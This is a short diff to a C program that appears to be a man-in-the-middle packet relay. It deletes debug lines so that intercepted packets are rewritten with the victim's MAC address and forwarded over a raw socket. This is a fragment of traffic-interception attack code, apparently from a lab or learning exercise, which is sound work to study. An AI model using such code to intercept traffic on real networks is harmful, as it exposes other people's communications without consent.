@@ -156,9 +156,6 @@ void main(void) {
             continue;
         }
 
-        printf("receive packet from router\n");
-        continue;
-
         // Modify the response's source MAC address to the target machine's
         // MAC address
         memcpy(
@@ -167,8 +164,6 @@ void main(void) {
             ETHER_ADDR_LEN
         );
         memcpy(eth_header->ether_dhost, victim_mac.bytes, ETHER_ADDR_LEN);
-        // memcpy(eth_header->ether_dhost, attacker_mac.bytes,
-        // ETHER_ADDR_LEN);
 
         // Send the modified response back to the target machine
         if (send(RAW_SOCK, BYTES_BUFFER, packet_size, 0) == -1) {
